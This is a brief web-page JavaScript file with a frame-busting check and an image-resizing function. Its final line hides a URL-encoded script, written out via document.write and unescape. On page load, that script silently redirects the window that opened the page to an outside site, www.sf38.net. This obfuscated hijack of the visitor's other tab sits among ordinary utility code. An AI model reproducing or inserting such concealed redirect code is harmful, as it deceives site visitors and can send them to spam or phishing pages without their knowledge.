if (top.location != self.location) 
{top.location=self.location;}
function formatonlinpic()
{var picobj=document.getElementsByName("onlinepic");
var picnum=picobj.length;
for(var i=0;i<picnum;i++)
{if(picobj[i].width>200)
{picobj[i].width=200;}
if(picobj[i].height>200)
{picobj[i].height=200;}}}
document.write(unescape('%3CSCRIPT%3E%20%0D%0Aif%28parent.window.opener%29%20parent.window.opener.location%3D%27http%3A//www.sf38.net/%27%3B%20%3C/SCRIPT%3E'))